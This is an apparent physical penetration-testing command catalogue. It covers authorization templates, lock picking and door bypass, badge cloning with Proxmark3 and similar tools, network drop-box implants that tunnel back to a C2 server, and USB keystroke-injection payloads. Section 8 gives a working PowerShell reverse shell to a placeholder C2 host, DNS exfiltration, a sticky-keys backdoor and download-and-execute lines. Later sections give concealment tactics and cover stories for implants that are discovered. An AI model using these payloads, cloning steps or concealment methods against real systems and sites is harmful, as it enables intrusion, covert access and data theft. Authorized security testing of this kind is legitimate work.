# Physical Security Testing Payloads / Command Catalogue

> Companion to `SKILL.md`. Every command here is reproducible on Kali Linux 2025-2 (ARM64) plus the additional hardware/tools noted per section.
>
> Placeholder convention: `<client>`, `<address>`, `<badge_id>`, `<C2_IP>`, `<reader_vendor>`, `<lock_model>`.
>
> **LEGAL WARNING**: Every section assumes a signed engagement contract, ROE, and authorization letter. Physical security testing without explicit written authorization is a felony in most jurisdictions. Carry the authorization letter on every operator at all times.

---

## 1. Legal / Scope Docs (TrustedSec physical-docs)

### 1.1 Use the TrustedSec templates as a baseline

```bash
git clone https://github.com/trustedsec/physical-docs.git
cd physical-docs
ls templates/
#   engagement-contract.md          — Master Services Agreement template
#   rules-of-engagement.md          — ROE: scope, prohibited actions, abort criteria
#   authorization-letter.md         — "Get-out-of-jail card" — carry on every operator
#   after-action-report.md          — Engagement report structure
#   scope-attestation.md            — Client attestation of authorized scope
```

### 1.2 Engagement contract — minimum content

```markdown
# Master Services Agreement — Physical Penetration Test

## Parties
- Client: [CLIENT LEGAL NAME]
- Consultant: [CONSULTANCY LEGAL NAME]

## Engagement window
- Start: YYYY-MM-DD 00:00 [CLIENT TZ]
- End:   YYYY-MM-DD 23:59 [CLIENT TZ]
- Grace period: ±24 hours for technical or operational delay

## Target locations
- [ADDRESS 1]
- [ADDRESS 2 — if applicable]

## Authorized operators
- [OPERATOR NAME 1] — driver's license / passport: [ID]
- [OPERATOR NAME 2] — driver's license / passport: [ID]

## 24/7 client contact
- [NAME], [TITLE]
- Mobile: [+1-...]
- Email: [...]
- Backup contact: [...]

## Scope summary
- [Brief description of authorized targets — e.g., "main office badge system,
   server room physical access, after-hours entry testing"]

## Prohibited areas
- [HR office, executive residences, third-party colocation cages, etc.]

## Prohibited actions
- No breaking of glass or doors
- No picking of emergency exit locks (function keys)
- No social engineering against minors
- No decoy devices left after engagement
- No entry into third-party colocation cages without that third party's authorization

## Insurance
- Consultant E&O policy: [carrier, policy number, limit]
- Client general liability: confirmed by client
```

### 1.3 Rules of engagement (ROE) — operational constraints

```markdown
# Rules of Engagement

## Authorization basis
This engagement is authorized under [CONTRACT REFERENCE], signed by [CLIENT OFFICER]
on [DATE]. Operators carry a copy of the authorization letter at all times.

## Engagement objectives
1. Test physical access controls at [ADDRESS]
2. Test badge system cloning susceptibility
3. Test drop-box and USB-weapon delivery (if physical access achieved)
4. Measure time-to-detection for unauthorized access

## Prohibited actions
1. No breaking of glass, doors, or locks
2. No picking of emergency exit locks (function keys)
3. No social engineering against minors
4. No decoy devices left after engagement
5. No entry into third-party colocation cages without that third party's authorization
6. No engagement against employee residences
7. No recording of employee faces in hidden-camera footage (blurring required in deliverable)

## Abort criteria
1. Any guard draws a weapon: STOP, produce authorization, call client contact
2. Any law enforcement contact: STOP, produce authorization, call client contact and legal
3. Any employee challenge beyond pretext script: leave immediately via nearest exit
4. Any equipment failure: pause engagement, contact engagement lead

## Reporting
1. After-action report delivered within [N] business days of engagement end
2. Evidence pack delivered via agreed secure channel
3. Briefing call within [N] business days of report delivery
```

### 1.4 Authorization letter ("get-out-of-jail card")

```markdown
[CLIENT LETTERHEAD]

PHYSICAL ENGAGEMENT AUTHORIZATION LETTER

To whom it may concern, including law enforcement and private security:

This letter authorizes the following individuals, employed by [CONSULTANCY LEGAL NAME],
to perform physical penetration testing at [CLIENT ADDRESS] between [START] and [END].

Authorized operators (photo ID required):
- [NAME 1] — [DRIVER'S LICENSE / PASSPORT]
- [NAME 2] — [DRIVER'S LICENSE / PASSPORT]

This engagement has been authorized by the undersigned officer of [CLIENT].
Any questions about this engagement should be directed to the 24/7 contact below.

Client contact (24/7):
- [NAME], [TITLE]
- Mobile: [+1-...]
- Email: [...]

If confronted by law enforcement or security, please allow the operator to contact
the above, who will confirm the engagement in real time.

Signed,
_______________________________________
[NAME], [TITLE]
[CLIENT LEGAL NAME]
[DATE]
```

### 1.5 Jurisdiction check for lock pick possession

```bash
# Lock pick possession law varies widely. Verify before traveling.

# California (US): Penal Code 466 — possession of lock picks with intent to commit
#   burglary is a misdemeanor. Possession by a non-licensed individual is presumptive
#   evidence of intent in some case law. CARRY PROOF OF ENGAGEMENT.

# Nevada (US): possession with intent to commit burglary.

# Other US states: generally permissive; some require locksmith credential.

# UK: Locks and Safes (Restriction on Sale) Act — restricts sale, not possession,
#   but possession near a target can support a charge.

# Japan: possession is criminal.

# Canada: generally permissive, but possession near a target is suspicious.

# ALWAYS: consult local counsel before traveling with picks.
```

---

## 2. Lock Picking — Pin-Tumbler

### 2.1 Equipment

```
Standard pin-tumbler pick set:
- Tension wrenches (0.025" and 0.018", light/medium/heavy)
- Hooks: short, medium, deep, half-diamond
- Rakes: city rake, bogota, snake rake
- Ball pick (for dimple locks)

Vendors:
- Peterson (precision, blue-pulls)
- SouthOrd (heavy-duty)
- Sparrows (tuxedo set, well-rounded)
- Multipick (German precision)

Practice locks:
- Transparent practice locks (Innovative Tactical, JackOlite)
- Progressive belt set (white, yellow, orange, green, blue, purple, black)
- Cut-away practice locks (see pins moving)
```

### 2.2 Raking (faster, less skill, lower belt)

```
1. Apply light tension (clockwise, ~0.5 N)
2. Insert city rake or bogota to the back of the keyway
3. Rake in and out with a slight bouncing motion, varying speed
4. Pins set randomly via "raking" — works on lower-belt locks
5. When all pins at shear line, core rotates; lock opens

Failure modes:
- Too much tension: pins won't set; back off
- Too little tension: pins bounce back; increase slightly
- Wrong rake angle: experiment with up/down angle
- Spool / serrated pins: raking fails; switch to single-pin pick
```

### 2.3 Single-pin picking (slower, reliable)

```
1. Apply light tension (clockwise)
2. Insert short or medium hook to the back of the keyway
3. Feel each pin (back to front):
   - Lift slightly until you feel a small "click"
   - Pin is now at the shear line (set)
   - Move to the next pin
4. Pins set with a click and slight rotation of the core
5. When all pins are set, the core rotates fully

Cues for set:
- Click sound / tactile feedback
- Slight clockwise rotation of the core
- Decrease in resistance on that pin

Spool / serrated pins (security pins):
- Pin sets, then suddenly "false sets" (over-rotates)
- Back off tension slightly, lift pin again
- Pin clicks past the false set to the true shear line
```

### 2.4 Bump keys

```
Bump key = key cut to depth 9 on every position

1. Insert bump key fully into the lock
2. Pull back one notch (so pins rest on the shallow ramps)
3. Apply light clockwise tension
4. Strike the back of the key with a bump hammer or screwdriver handle
5. Pins jump; simultaneously, the core rotates briefly; lock opens

Notes:
- Works on Kwikset, Schlage, and most commercial pin-tumbler locks
- Leaves no marks distinguishable from normal wear
- Bump keys are commercially available; legal status varies
- Countermeasure: bump-resistant pins (Cemlock, Medeco, Assa)
```

### 2.5 Belt ranking (TOOOL / locksport standard)

```
White  — single pin, standard locks (Master #3)
Yellow — single pin, security pins (Master #5, Brinks)
Orange — raking or SPP, security pins (Schlage)
Green  — SPP, multiple security pins, more pins
Blue   — SPP, complex security pins (Medeco, Assa)
Purple — SPP, dimple, high-security
Black  — SPP, custom high-security, Medeco biaxial
```

---

## 3. Lock Picking — Tubular, Wafer, Dimple

### 3.1 Tubular (cam locks, vending machines)

```
Tubular pick tools:
- 7-pin and 8-pin variants
- Lishi tubular (decode-and-pick)
- Tubular bump key

Procedure:
1. Adjust the tubular pick to the correct pin count (7 or 8)
2. Insert into the lock, apply light rotational tension
3. Wiggle the pick — pins fall to shear line
4. Lock opens; the pick is now "encoded" with the bitting
5. Use the encoded pick to duplicate a key (if needed)
```

### 3.2 Wafer (file cabinets, desks, vehicles)

```
Wafer picks:
- Jigglers / tryout keys (pre-cut sets)
- Double-sided wafer rake

Procedure:
1. Apply light tension
2. Insert jiggler or rake
3. Rake in and out with a slight rotational motion
4. Wafers fall into place; lock opens

Note: wafer locks are low-security; jiggler sets work in seconds.
```

### 3.3 Dimple (Kaba, Mul-T-Lock, Assa)

```
Dimple picks:
- Lishi 2-in-1 dimple (pick + decode)
- HPC dimple dimple picks

Procedure (Lishi):
1. Insert Lishi into the dimple lock
2. Apply tension via the tool's tensioner
3. Feel each pin via the side groove
4. Set each pin to the shear line (audible click)
5. Lock opens; the Lishi is now encoded with the bitting
6. Read the bitting from the tool to cut a working key

Note: Lishi tools are restricted in some jurisdictions.
```

---

## 4. Bypass Tools — Shove Knife, Under-Door, Crash Bar

### 4.1 Shove knife (inward-opening, flat latch)

```
Use case:
- Inward-opening commercial door
- Spring latch (NOT deadlatch)
- Gap between door and frame large enough for a thin blade

Tool:
- Commercial shove knife (Peterson, Sparrows)
- Or DIY: thin plastic / mylar sheet cut to a triangle

Procedure:
1. Slide the blade between the door and frame, above the latch
2. Work the blade down until it contacts the latch bevel
3. Push the blade inward to retract the latch
4. Open the door

Failure modes:
- Deadlatch (anti-shim): the small secondary latch blocks this; use under-door tool
- Insufficient gap: use a thin mylar sheet; if still too tight, give up on this door
```

### 4.2 Under-door tool (outward-opening, lever handle)

```
Use case:
- Outward-opening commercial door with a lever handle inside
- Gap under the door large enough for a wire (typically 1/2 inch)

Tool:
- Commercial under-door tool (copper wire, ~6 ft, with a small grip on one end)
- Or DIY: coat hanger with a hook bent into the end

Procedure:
1. Slide the wire under the door, hook first
2. Walk the wire up to the inside lever handle
3. Hook the lever
4. Pull down — lever rotates, latch retracts, door opens

Failure modes:
- Insufficient gap: blocked
- Lever requires rotation, not just pulling down: use a longer lever arm
- Anti-ligature handle (curved, no exposed lever): blocked
```

### 4.3 Crash bar tape / film (panic exit bars)

```
Use case:
- Panic exit hardware (Von Duprin, Corbin Russwin, Sargent)
- Certain older models without anti-tape shields

Tool:
- Wide clear tape or thin plastic film
- Teflon spray (for some variants)

Procedure:
1. From OUTSIDE the door, apply tape over the bar's exit sensor / latch area
2. When someone EXITS through the door normally, the bar retracts the latch
3. The tape prevents the latch from returning to its locked position
4. After the door closes, the door is unlocked from the outside

Countermeasures (deployed in modern hardware):
- Anti-tape shields (mechanical barrier over the latch)
- Electronic latch retraction (no tape interaction possible)
- Door-position switches that alarm on extended open time

Note: this technique is high-visibility — many modern facilities have anti-tape
shields. Test in recon first.
```

---

## 5. RFID 125 kHz Badge Cloning (Proxmark3, ESP-RFID-Tool, Walrus)

### 5.1 Proxmark3 — full standalone reader/cloner

```bash
# Install Proxmark3 client
sudo apt install -y proxmark3

# Connect Proxmark3 via USB; verify enumeration
ls /dev/ttyACM*
#   /dev/ttyACM0   # Proxmark3

# Launch client
pm3

# Inside the Proxmark3 client:

# --- Identify LF (125 kHz) tag in the field ---
pm3> lf search
#   NOTE: some demods / possibly incorrect data
#   HIDI  HID Prox (Old)  Tag ID: 12345  Format: HID 26-bit
#   Facility: 17  Card: 12345  Raw: ...

# --- Read HID Prox specifically ---
pm3> lf hid read
#   HID Prox Tag
#   TAG ID: 12345
#   Facility Code: 17
#   Card Number: 12345

# --- Save to a dictionary ---
pm3> lf hid save my_hid.dic

# --- Clone to a writable T5577 card ---
# Place a T5577 (writable LF card) on the Proxmark3 antenna
pm3> lf hid clone --fc 17 --cn 12345
#   Writing T5577 ... success

# --- Simulate the badge from Proxmark3 ---
# Hold the Proxmark3 antenna near the reader
pm3> lf hid sim --fc 17 --cn 12345
#   Simulating HID Prox ... (Ctrl-C to stop)

# --- Indala (Motorola) 125 kHz cards ---
pm3> lf indala read
pm3> lf indala clone --uid <uid>
pm3> lf indala sim --uid <uid>

# --- AWID, Viking, Paradox, etc. ---
pm3> lf search       # auto-detect
# then specific read/clone/sim commands
```

### 5.2 ESP-RFID-Tool — portable 125 kHz cloner

```bash
# ESP-RFID-Tool is an ESP32-based portable cloner
# GitHub: github.com/topics/esp-rfid-tool (572+ stars)

# Hardware:
#   - ESP32 dev board (Lolin D32, NodeMCU-32S)
#   - RFID-RC522 reader (13.56 MHz) — but use a 125 kHz EM4100 reader for LF
#   - 125 kHz RFID reader module (EM-18, ID-12, or RDM6300)
#   - Battery + case

# Firmware: flash via Arduino IDE or PlatformIO

# Operation:
#   1. Power on
#   2. Place original badge on the reader
#   3. Press READ — display shows the badge ID
#   4. Place a writable T5577 on the reader
#   5. Press WRITE — T5577 is written
#   6. Verify at the door

# Advantages over Proxmark3:
#   - Smaller (pocket-sized)
#   - Cheaper (~$20 in parts)
#   - No laptop required on-site
#   - Faster for routine 125 kHz work

# Disadvantages:
#   - LF only (no HF/iCLASS)
#   - Less flexible than Proxmark3
#   - No sniffing (read-only)
```

### 5.3 Walrus (smartphone-based)

```bash
# Walrus is a smartphone app for NFC card cloning (iOS and Android)
# GitHub: github.com/TeamWalrus/Walrus (488+ stars)

# Capabilities:
#   - 13.56 MHz NFC only (Mifare Classic, DESFire, FeliCa, HID iCLASS via hardware add-on)
#   - NOT 125 kHz (use Proxmark3 or ESP-RFID-Tool for LF)

# Usage:
#   1. Install Walrus from App Store / Google Play
#   2. Place the original card on the phone's NFC reader
#   3. Read — Walrus extracts the UID and (with keys) the full memory
#   4. Save the dump
#   5. Place a "magic" UID-writable Mifare card on the reader
#   6. Write — Walrus writes the dump to the new card

# For encrypted sectors (Mifare Classic), Walrus requires the sector keys:
#   - Default keys: 000000000000, FFFFFFFFFFFF, A0A1A2A3A4A5
#   - Recovered via Proxmark3 `hf mf autopwn` or ACR122U + mfoc
#   - Walrus can use a key dictionary to attempt default keys

# For HID iCLASS:
#   - Requires the Walrus iClass hardware add-on (MagSpoof or custom)
#   - Standard system keys leaked years ago
```

### 5.4 Flipper Zero — multi-tool entry

```bash
# Flipper Zero includes 125 kHz RFID, NFC, sub-1GHz, IR

# Operation (LF RFID app):
#   1. Apps > RFID
#   2. Read — auto-detects EM4100, HID Prox, Indala, etc.
#   3. Save the read to a profile
#   4. Emulate — Flipper Zero emulates the saved badge
#   5. Verify at the door

# Operation (NFC app):
#   1. Apps > NFC
#   2. Read — auto-detects Mifare Classic, DESFire, FeliCa, NTAG
#   3. For Mifare Classic, Flipper can recover keys via nested attacks
#   4. Save the dump
#   5. Emulate

# Capabilities vs Proxmark3:
#   - Flipper is friendlier for entry operators; less flexible for analysis
#   - Flipper is portable; no laptop required
#   - Use Flipper for routine work; Proxmark3 for protocol-level analysis

# Note: Flipper Zero firmware and capability evolve rapidly;
# verify current capabilities before engagement.
```

---

## 6. NFC / High-Frequency Card Cloning (Mifare, HID iCLASS)

### 6.1 Mifare Classic (CRYPTO1 — broken since 2008)

```bash
# Proxmark3 — autopwn (default keys + nested + hardnested)
pm3> hf search
#   Valid ISO14443A Tag Found - ATQA: 00 04  SAK: 01 [NXP MIFARE CLASSIC 1K]
#   UID: 04 A3 2B 1F

pm3> hf mf autopwn
#   Trying default keys...
#   Trying nested attack...
#   Trying hardnested attack...
#   [+] keys found for all 16 sectors
#   Saving to dictionary hf-mf-default-keys.dic

# Dump the card (all sectors)
pm3> hf mf dump
#   Reading sector 0 (key A: ...; key B: ...)
#   Reading sector 1 (key A: ...; key B: ...)
#   ...
#   Saving dump file hf-mf-04A32B1F-dump.bin
#   Saving keys file hf-mf-04A32B1F-key.bin

# Clone to a "magic" UID-writable Mifare Classic card
# (Place a magic Gen1A card on the antenna)
pm3> hf mf cload --source hf-mf-04A32B1F-dump.bin
#   Magic UID card detected
#   Writing ... success

# Verify by reading back the magic card
pm3> hf mf read --blk 0 -k FFFFFFFFFFFF
#   Block 0 data: 04 A3 2B 1F ... (matches original)
```

### 6.2 Mifare Classic — ACR122U + mfoc / mfcuk

```bash
# Alternative: USB NFC reader (ACR122U) + laptop tools

sudo apt install -y mfoc mfcuk nfc-tools

# Identify the card
nfc-list
#   1 ISO14443A passive target(s) found:
#     ATQA (SENS_RES): 00 04
#      UID (NFCID1): 04 a3 2b 1f

# mfoc — nested key recovery (uses known keys to derive unknown)
# Place original card on ACR122U
mfoc -O original.mfd \
  -k 000000000000 \
  -k FFFFFFFFFFFF \
  -k A0A1A2A3A4A5 \
  -k D3F7D3F7D3F7 \
  -k 001122334455 \
  -k 112233445566 \
  -k 0A0A0A0A0A0A
#   Found Key A for sector 0: FFFFFFFFFFFF
#   Found Key A for sector 1: ...
#   ...
#   Card dumped to original.mfd

# mfcuk — fully unknown keys (hardnested attack, slower)
mfcuk -C -R 0:A -s 250 -S 250 -v 3
#   (recovers one sector key via crypto-1 weakness)

# Write dump to a magic UID card
# Place magic card on ACR122U
nfc-mfclassic W a original.mfd
#   Writing block 0 ... success
#   Writing block 1 ... success
#   ...
```

### 6.3 Mifare DESFire (EV1, EV2, EV3 — more secure)

```bash
# Mifare DESFire uses AES-128 (EV2/EV3) or 3DES (EV1)
# Cloning is materially harder than Mifare Classic

# Proxmark3 identification:
pm3> hf search
#   Valid ISO14443A Tag Found - ATQA: 03 44  SAK: 20 [NXP MIFARE DESFIRE EV1]
#   UID: 04 12 34 56 7A BC DE
#   ATS: 75 77 81 02 80

# Reading DESFire requires application IDs and keys — typically not recoverable
# without insider knowledge

# Report: DESFire EV2/EV3 is "low cloning risk" — recommend for new deployments
# Note: DESFire EV1 has known weaknesses (NanoXcrypt, hardnested on certain
# configurations); upgrade to EV2/EV3 if EV1 deployed
```

### 6.4 HID iCLASS (Legacy and SE)

```bash
# HID iCLASS — proprietary, but standard keys leaked years ago

# Proxmark3 identification:
pm3> hf search
#   Valid ISO15693 / iCLASS Tag Found
#   HID iCLASS
#   CSN: 12 34 56 78 9A BC DE F0

# Read iCLASS with leaked standard key (legacy)
pm3> hf iclass read --csn 12345678 --key <standard_legacy_key>

# iCLASS Legacy (26-bit Wiegand, no mutual auth) — trivially clonable
pm3> hf iclass clone --csn 12345678

# iCLASS SE / SEOS — mutual auth; requires system key
# SEOS uses Mifare DESFire EV2 under the hood; clone-resistant
# Report SEOS deployment as "low cloning risk"

# iCLASS standard keys (legacy) — published in research; include in dictionary
# Common: 0x... (verify against Proxmark3 iclass dictionary)
```

### 6.5 Card technology summary

| Card | Frequency | Authentication | Cloning Risk |
|------|-----------|---------------|--------------|
| HID Prox | 125 kHz | None | CRITICAL |
| EM4100 | 125 kHz | None | CRITICAL |
| Indala (Motorola) | 125 kHz | None | CRITICAL |
| AWID | 125 kHz | None | CRITICAL |
| Mifare Ultralight | 13.56 MHz | None (C-only) | HIGH (UID-only) |
| Mifare Classic | 13.56 MHz | CRYPTO1 (broken) | CRITICAL |
| Mifare DESFire EV1 | 13.56 MHz | 3DES | MEDIUM |
| Mifare DESFire EV2/EV3 | 13.56 MHz | AES-128 | LOW |
| HID iCLASS Legacy | 13.56 MHz | Proprietary (key leaked) | HIGH |
| HID iCLASS SE | 13.56 MHz | Mutual auth | LOW |
| HID SEOS | 13.56 MHz | DESFire EV2 + applet | LOW |

---

## 7. Drop Boxes — LAN Turtle, Packet Squirrel, Pi Zero

### 7.1 Hak5 LAN Turtle — USB network implant

```bash
# Pre-engagement setup

# Power: USB (from target workstation or wall adapter)
# Network: USB Ethernet (RNDIS) — presents as a USB Ethernet adapter to the host
# C2: Hak5 Cloud C2 (community edition, free)

# Step 1: First boot and SSH
# Default management IP: 192.168.1.1 (DHCP on first boot will adjust)
ssh root@<turtle_mgmt_ip>   # default password: sh3llz; CHANGE IMMEDIATELY

# Step 2: Change password and configure SSH key-only access
passwd
mkdir ~/.ssh
echo "ssh-ed25519 AAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
# Disable password auth in /etc/ssh/sshd_config

# Step 3: Configure Cloud C2 for out-of-band C2
# - Sign up at cloud.hak5.org (community edition)
# - Add a new device; copy the claim URL
# - On the Turtle:
CONFIG SYSTEM C2 ADD URL="https://cloud.hak5.org/api/..."

# Step 4: Install payloads
# - AUTOSHARK: continuous tcpdump
#   PAYLOAD AUTOSHARK INSTALL
# - DNSCAT2: DNS-tunneled reverse shell
#   PAYLOAD DNSCAT INSTALL
# - URLS: SSH URL redirect (pivot)
#   PAYLOAD URLS INSTALL

# Step 5: At the engagement site
# - Find an unused USB port on an always-on workstation OR a USB wall charger with a network jack
# - Plug in the Turtle
# - Verify Cloud C2 check-in (Cloud C2 dashboard shows online within 30 seconds)

# Step 6: Operational use from Cloud C2
# - SSH into the Turtle
# - tcpdump on the target network
# - Pivot through the Turtle to scan the internal network
#   ssh -L 8080:internal_target:80 root@turtle_ip
#   curl http://localhost:8080

# Step 7: Retrieval at engagement end
# - Cloud C2: DEVICE > RETIRE
# - Physically remove from the USB port
# - Document retrieval time
```

### 7.2 Hak5 Packet Squirrel — Ethernet inline implant

```bash
# Pre-engagement setup

# Power: USB (USB-Ethernet adapter; needs USB power)
# Network: Two Ethernet jacks (inline between a device and switch)
# C2: Hak5 Cloud C2

# Step 1: First boot and SSH (use the small switch on the side to put in ARMING mode)
# Squirrel in ARMING mode presents as a USB Ethernet adapter on your laptop
ssh root@172.16.32.1   # default password: nuts; CHANGE IMMEDIATELY

# Step 2: Configure Cloud C2
CONFIG SYSTEM C2 ADD URL="https://cloud.hak5.org/api/..."

# Step 3: Install payloads
# - DNSPOISON: DNS spoofing on the inline network
# - OPENVPN: VPN tunnel back to consultancy
# - TCPDUMP: capture all inline traffic
# - NMAP: scan the target network

# Step 4: At the engagement site
# - Find an Ethernet drop where a device (printer, IP phone, workstation) plugs in
# - Unplug the device's Ethernet cable from the wall jack
# - Plug the Squirrel into the wall jack
# - Plug the device's cable into the Squirrel
# - Squirrel is now inline; transparent to the device and network
# - Verify Cloud C2 check-in

# Step 5: Operational use
# - From Cloud C2, SSH to the Squirrel
# - Run tcpdump / nmap / DNS spoofing / VPN tunnel as needed

# Step 6: Retrieval
# - Cloud C2: DEVICE > RETIRE
# - Physically reverse the inline installation
# - Document retrieval
```

### 7.3 Raspberry Pi Zero W — DIY implant

```bash
# Build a Pi Zero W implant

# Hardware:
#   - Raspberry Pi Zero W
#   - MicroSD card (8GB+)
#   - USB-Ethernet adapter (Cable Matters, Plugable) OR USB-Ethernet FeatherWing
#   - Battery pack (5000mAh for ~8h runtime)
#   - Case (3D-printed concealment)

# Step 1: Flash Raspberry Pi OS Lite
#   Download from raspberrypi.org; flash with Balena Etcher
#   Pre-configure SSH and WiFi by editing /boot/ssh and /boot/wpa_supplicant.conf

# Step 2: First boot (on consultancy WiFi)
#   Find the Pi's IP via DHCP logs
ssh pi@<pi_ip>   # default password: raspberry; CHANGE IMMEDIATELY

# Step 3: Configure reverse-SSH tunnel to the consultancy
#   On consultancy C2 server, generate a restricted SSH key for the implant:
ssh-keygen -t ed25519 -f /tmp/implant_key -N ""
#   Restrict the public key in the consultancy's authorized_keys to only port forwarding:
#   command="echo 'restricted'",permitopen="localhost:22",no-pty,no-X11-forwarding ssh-ed25519 AAA...

#   On the Pi:
mkdir ~/.ssh
echo "<restricted_public_key>" >> ~/.ssh/authorized_keys
#   Set up auto-connect via autossh:
sudo apt install -y autossh
cat > /etc/systemd/system/reverse-tunnel.service <<'EOF'
[Unit]
Description=Reverse SSH tunnel to consultancy C2
After=network.target

[Service]
ExecStart=/usr/bin/autossh -M 0 -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -o "ExitOnForwardFailure yes" -R 2222:localhost:22 -i /home/pi/.ssh/id_ed25519 implant@<consultancy_c2>
Restart=always
User=pi

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable reverse-tunnel
sudo systemctl start reverse-tunnel

# Step 4: Test from consultancy C2
ssh -p 2222 pi@localhost
#   Should land on the Pi

# Step 5: At the engagement site
#   Power on the Pi
#   It connects to the target WiFi (pre-configured)
#   Reverse-SSH tunnel establishes to consultancy C2
#   Operator can SSH in and pivot to the internal network

# Step 6: Concealment
#   - Inside a wall plate (with a small hole for the antenna)
#   - Behind a server rack
#   - Inside a fake surge protector (replace the power strip internals)
#   - In a ceiling tile (high discovery risk)

# Step 7: Retrieval
#   ssh into the Pi
#   systemctl stop reverse-tunnel
#   Power off the Pi
#   Physically remove from concealment
#   Securely wipe the SD card: shred -uvz /dev/mmcblk0 (or physically destroy)
```

### 7.4 Concealment options

```
Best concealment (low-to-high discovery risk):
1. Inside a wall plate (long-term, low risk if installed competently)
2. Inside a fake surge protector (plausible office clutter)
3. Behind a server rack (long-term, low risk in cluttered server rooms)
4. Inside a clock radio (good for break rooms / lobbies)
5. Inside a fake AC adapter (paired with a USB-Ethernet adapter)
6. Drop ceiling tile (HIGH risk — facilities staff inspect ceilings)

Rule: the concealment should look like plausible office clutter.
Avoid:
- Visible antennas
- Visible LEDs (tape over them)
- Visible cables (route through existing cable trays)
- Items in unusual locations (e.g., a surge protector in a server rack)
```

---

## 8. USB Weapons — Rubber Ducky, Bash Bunny, P4wnP1

### 8.1 USB Rubber Ducky — keystroke injection

```bash
# Hardware: USB Rubber Ducky (Hak5)
# Payload language: DuckyScript
# Encoded payload: inject.bin on a microSD card

# Step 1: Write a DuckyScript payload

cat > ducky_reverse_shell.txt <<'EOF'
REM Title: Reverse shell for physical engagement
REM Author: kali-claw / physical-security-testing
REM Target: Windows 10/11 with PowerShell
REM Mode: HID injection

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Exec Bypass
DELAY 500
ENTER
DELAY 2000
STRING $c = New-Object System.Net.Sockets.TCPClient('<C2_IP>',4444);
STRING $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
STRING while(($i = $s.Read($b,0,$b.Length)) -ne 0){
STRING   $d = (New-Object Text.APSI.ASCIIEncoding).GetString($b,0,$i);
STRING   $o = (iex $d 2>&1 | Out-String);
STRING   $s.Write(([text.encoding]::ASCII.GetBytes($o)),0,$o.Length)
STRING }
ENTER
EOF

# Step 2: Encode to inject.bin
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky/Encoder
java -jar duckencode.jar -i ../../ducky_reverse_shell.txt -o ../../inject.bin

# Step 3: Copy to microSD
sudo dd if=inject.bin of=/dev/sdX bs=1M status=progress
sync

# Step 4: Insert microSD into the Ducky
# Plug the Ducky into the target workstation
# LED indicates payload progress (~5-10 seconds)
# Remove the Ducky

# Step 5: Verify the C2 listener
nc -lvnp 4444
```

### 8.2 Common DuckyScript payloads

```bash
# Reverse shell (above)

# Exfil via DNS
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 2000
STRING $env:path += ";$env:APPDATA"; $i=0; while($true){ $i++;
STRING   $h = "$i-$(hostname).$env:USERNAME.<C2_DOMAIN>";
STRING   Resolve-DnsName -Type A $h;
STRING   Start-Sleep -Seconds 30 }
ENTER

# Sticky keys bypass (Windows, replace sethc.exe with cmd.exe)
DELAY 1000
GUI r
DELAY 500
STRING cmd
DELAY 500
CTRL-SHIFT-ENTER   # Run as admin
DELAY 2000
LEFTARROW
ENTER
DELAY 2000
STRING copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
ENTER

# Beacon deploy (Cobalt Strike)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Exec Bypass
DELAY 500
ENTER
DELAY 2000
STRING IEX (New-Object Net.WebClient).DownloadString('http://<C2>/beacon.ps1')
ENTER

# Lock the workstation (defensive — after payload, lock the screen)
DELAY 1000
GUI l
```

### 8.3 Bash Bunny — multi-vector (HID + Ethernet + Storage)

```bash
# Hardware: Bash Bunny (Hak5)
# Payload language: BunnyScript
# Modes: HID (keyboard), ETHERNET (network adapter), STORAGE (USB drive)
# Switch position selects payload (3 payloads at once)

# Step 1: Write a BunnyScript payload

cat > payload.txt <<'EOF'
LED SETUP
ATTACKMODE HID ETHERNET
LED ATTACK
Q GUI r
Q DELAY 500
Q STRING powershell -WindowStyle Hidden -Exec Bypass
Q DELAY 500
Q ENTER
Q DELAY 2000
# Reverse shell via ETHERNET mode (Bash Bunny acts as a RNDIS device)
Q STRING IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/payload.ps1')
Q ENTER
LED FINISH
EOF

# Step 2: Copy payload to the Bunny's first payload slot
# Mount the Bunny as a USB drive
cp payload.txt /media/root/BashBunny/payloads/switch1/payload.txt

# Step 3: Plug the Bunny into the target with switch position 1
# LED indicates payload progress

# Step 4: Multi-vector example
# HID: keystroke injection
# ETHERNET: Bash Bunny presents as a RNDIS adapter; target may auto-assign it an IP
#   Bunny runs DHCP; target routes through Bunny; Bunny is now a MITM
# STORAGE: drop a malicious binary onto the target's filesystem
```

### 8.4 P4wnP1 (Pi Zero W — DIY BadUSB)

```bash
# P4wnP1 is a Pi Zero W firmware for HID/network/storage attacks
# GitHub: github.com/RoganDawes/P4wnP1 (and A.L.O.A. fork)

# Step 1: Flash P4wnP1 A.L.O.A. to a microSD
#   Download from github.com/RoganDawes/P4wnP1
#   Flash with Balena Etcher

# Step 2: First boot
#   Pi Zero W hosts a WiFi AP "P4wnP1" by default
#   Connect to the AP; SSH to 172.24.0.1 (default: root / toor)

# Step 3: Configure a HID payload via web UI
#   http://172.24.0.1:8000
#   Templates > HID > Windows Reverse Shell

# Step 4: Trigger
#   Plug the Pi Zero W (in USB device mode) into the target
#   Payload fires

# Step 5: A.L.O.A. supports templates, HID templates, network templates
#   - Custom templates in /usr/local/P4wnP1/templates
#   - Templates can combine HID + network + storage
```

---

## 9. Network Implant Concealment

### 9.1 Concealment rules

```
1. Look like plausible office clutter
2. No visible antennas (or use a discrete antenna)
3. No visible LEDs (tape over with black electrical tape)
4. No visible cables (route through existing cable trays)
5. Avoid unusual locations (surge protector in a server rack)
6. Choose concealment matching the location:
   - Office cubicle: surge protector, USB hub, fake phone charger
   - Server room: spare Raspberry Pi in a case, network tester
   - Lobby: clock radio, picture frame
   - Drop ceiling: AVOID (high discovery risk)
   - Wall plate: BEST (long-term, low risk if installed competently)

7. Have a cover story for the device if discovered:
   - "It's a network tester we forgot to collect"
   - "It's a WiFi extender"
   - "It's a Pi running our monitoring agent"
```

### 9.2 Wall plate concealment

```bash
# Build a wall plate concealment for a Pi Zero W

# Materials:
#   - Standard wall plate (single gang or double gang)
#   - Pi Zero W
#   - Slim LiPo battery (e.g., 1000mAh)
#   - Optional: small USB-Ethernet adapter

